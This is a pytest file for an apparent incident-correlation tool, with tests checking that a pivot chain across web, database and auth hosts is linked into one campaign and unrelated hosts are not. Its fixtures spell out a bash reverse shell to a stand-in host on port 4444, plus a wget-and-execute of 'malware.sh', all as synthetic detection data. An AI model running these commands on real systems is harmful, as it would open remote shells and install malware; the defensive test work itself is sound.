"""
tests/test_campaign_correlation.py — linking incidents across hosts.

Grouping by host answers "what happened on this machine" but hides the finding that
matters most: whether one intruder moved between machines. These tests pin both
directions — a real pivot chain must be linked, and unrelated hosts must not be,
because over-linking turns every quiet night into one giant false campaign.
"""

import pytest

from ingest.ingest import ingest_events, ingest_file
from detect.correlate import build_incidents


@pytest.fixture(autouse=True, scope="module")
def restore_demo_data():
    yield
    ingest_file()


def _proc(host, user, src, dst, cmdline, minute):
    """A Sysmon process-creation event, which the Linux detectors key off."""
    return {
        "time": f"2026-07-03T20:{minute:02d}:00", "host": host, "source": "Sysmon",
        "event_id": 1, "user": user, "ip": src, "dest_ip": dst,
        "image": "bash", "cmdline": cmdline,
    }


REVERSE_SHELL = "bash -c 'exec bash -i &>/dev/tcp/203.0.113.50/4444 <&1'"
DOWNLOAD = "wget http://203.0.113.50/malware.sh -O /tmp/malware.sh"


def test_pivot_chain_across_hosts_is_one_campaign():
    """web -> db -> auth, each hop sharing the previous hop's address."""
    ingest_events([
        _proc("web-01", "www-data", "203.0.113.50", "10.0.0.100", REVERSE_SHELL, 5),
        _proc("db-01", "postgres", "10.0.0.100", "10.0.0.200", DOWNLOAD, 8),
        _proc("auth-01", "deploy", "10.0.0.200", "10.0.0.200",
              "chmod +x /tmp/malware.sh && /tmp/malware.sh", 12),
    ])
    incidents = build_incidents()
    assert len(incidents) == 3, "hosts are still triaged separately"
    campaigns = {i["campaign_id"] for i in incidents}
    assert campaigns == {1}, f"all three hosts should share one campaign, got {campaigns}"
    web = next(i for i in incidents if i["host"] == "web-01")
    assert set(web["related_hosts"]) == {"db-01", "auth-01"}
    assert {p["host"] for p in web["campaign_peers"]} == {"db-01", "auth-01"}


def test_unrelated_hosts_are_not_linked():
    """No shared address and no shared account — these are two separate problems."""
    ingest_events([
        _proc("web-01", "www-data", "203.0.113.50", "10.0.0.100", REVERSE_SHELL, 5),
        _proc("lab-09", "student", "192.168.9.9", "192.168.9.10", REVERSE_SHELL, 9),
    ])
    incidents = build_incidents()
    assert len(incidents) == 2
    assert all(i["campaign_id"] is None for i in incidents), "unrelated hosts were merged"


def test_generic_account_alone_does_not_link_hosts():
    """Two machines both having a 'root' proves nothing; linking on it would tie the
    whole estate into one campaign."""
    ingest_events([
        _proc("web-01", "root", "192.168.1.10", "192.168.1.11", REVERSE_SHELL, 5),
        _proc("lab-09", "root", "172.16.5.5", "172.16.5.6", REVERSE_SHELL, 9),
    ])
    incidents = build_incidents()
    assert all(i["campaign_id"] is None for i in incidents), "linked on a generic account"


def test_distant_activity_is_not_one_campaign():
    """A shared address hours apart is not evidence of a single operation."""
    ingest_events([
        _proc("web-01", "www-data", "203.0.113.50", "10.0.0.100", REVERSE_SHELL, 1),
        {"time": "2026-07-03T23:30:00", "host": "db-01", "source": "Sysmon",
         "event_id": 1, "user": "postgres", "ip": "10.0.0.100", "dest_ip": "10.0.0.200",
         "image": "bash", "cmdline": DOWNLOAD},
    ])
    incidents = build_incidents()
    assert all(i["campaign_id"] is None for i in incidents), "linked across a 3h gap"


def test_single_incident_has_no_campaign():
    ingest_events([_proc("web-01", "www-data", "203.0.113.50", "10.0.0.100", REVERSE_SHELL, 5)])
    incidents = build_incidents()
    assert len(incidents) == 1
    assert incidents[0]["campaign_id"] is None
    assert incidents[0]["related_hosts"] == []
